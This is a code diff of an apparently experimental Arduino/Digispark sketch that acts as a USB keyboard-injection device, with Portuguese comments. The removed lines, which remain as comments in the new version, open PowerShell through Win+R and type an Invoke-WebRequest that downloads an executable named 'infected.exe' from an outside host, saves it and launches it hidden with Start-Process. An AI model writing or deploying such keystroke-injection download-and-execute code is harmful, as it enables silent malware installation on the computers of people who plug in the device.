@@ -10,6 +10,10 @@ void sendSlash() {
   DigiKeyboard.sendKeyStroke(84);  // '/'
 }
 
+void sendSlash_() {
+  DigiKeyboard.sendKeyStroke(46);  // '\'
+}
+
 void sendQuotes() {
   DigiKeyboard.sendKeyStroke(53, MOD_SHIFT_LEFT);  // "Aspas"
 }
@@ -30,44 +34,45 @@ void setup() {
 
   // Abre o powershell
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Pressiona Win+R
-  delay(1000);
-  DigiKeyboard.print("Powershell");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Pressiona Enter
-  delay(1000);
+  delay(200);
+  sendSlash_();
+  // DigiKeyboard.print("Powershell");
+  // DigiKeyboard.sendKeyStroke(KEY_ENTER); // Pressiona Enter
+  // delay(200);
 
-  DigiKeyboard.print("Invoke-WebRequest -Uri ");
-  delay(100);
-  sendQuotes();
-  delay(100);
-  DigiKeyboard.print("https");
-  sendColon();
-  delay(100);
-  sendSlash();
-  delay(100);
-  sendSlash();
-  delay(100);
-  DigiKeyboard.print("alld.dev");
-  sendSlash();
-  delay(100);
-  DigiKeyboard.print("assets");
-  sendSlash();
-  delay(100);
-  DigiKeyboard.print("others");
-  sendSlash();
-  delay(100);
-  DigiKeyboard.print("Servi");
-  sendCsidilha();
-  DigiKeyboard.print("os Windows infected.exe");
-  sendQuotes();
-  delay(100);
-  DigiKeyboard.print("-Outfile Texte.exe");
-  sendPointv();
-  delay(100);
-  DigiKeyboard.print(" Start-Process -NoNewWindow -FilePath .");
-  sendSlash();
-  delay(100);
-  DigiKeyboard.print("Teste.exe");
-  delay(100);
+  
+  // DigiKeyboard.print("Invoke-WebRequest -Uri ");
+  // sendQuotes();
+  // DigiKeyboard.print("https");
+  // sendColon();
+  // sendSlash();
+  // delay(100);
+  // sendSlash();
+  // delay(100);
+  // DigiKeyboard.print("alld.dev");
+  // sendSlash();
+  // delay(100);
+  // DigiKeyboard.print("assets");
+  // sendSlash();
+  // delay(100);
+  // DigiKeyboard.print("others");
+  // sendSlash();
+  // delay(100);
+  // DigiKeyboard.print("Servi");
+  // sendCsidilha();
+  // DigiKeyboard.print("os Windows infected.exe");
+  // sendQuotes();
+  // delay(100);
+  // DigiKeyboard.print("-Outfile Texte.exe");
+  // sendPointv();
+  // delay(100);
+  // DigiKeyboard.print(" Start-Process -NoNewWindow -FilePath .");
+
+  // DigiKeyboard.print("Teste.exe");
+  // DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  // delay(5000);
+  // DigiKeyboard.print("Exit");
+  // DigiKeyboard.sendKeyStroke(KEY_ENTER); 
   digitalWrite(1, LOW);
 }
 
